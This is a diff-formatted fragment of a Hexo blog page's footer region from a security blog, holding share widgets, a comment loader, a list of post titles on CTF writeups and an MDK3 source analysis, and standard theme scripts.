+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"MDK3源码分析　| DazzleP's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2132732';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/05/05/BCTF-2017-babyuse/" title="下一篇: BCTF 2017 babyuse">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/31/MDK3源码分析/">MDK3源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/05/BCTF-2017-babyuse/">BCTF 2017 babyuse</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/0ctf-2017-writeup/">0ctf 2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/ZCTF-2017-write-up/">ZCTF 2017 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/">FSOP以及glibc针对其所做的防御措施</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/HCTF-2016-writeup/">HCTF-2016-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/">HITCON CTF 2016 ShellingFolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/24/Simple-Core-Dump-analyser/">Simple Core Dump analyser</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/15/Producing-Overlapping-Chunks/">Producing Overlapping Chunks</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/HITCON-CTF-2016-SerectHolder/">HITCON CTF 2016 SerectHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/LCTF2016-PWN400/">LCTF2016 PWN400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/LCTF2016-PWN300/">LCTF2016 PWN300</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 DazzleP
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
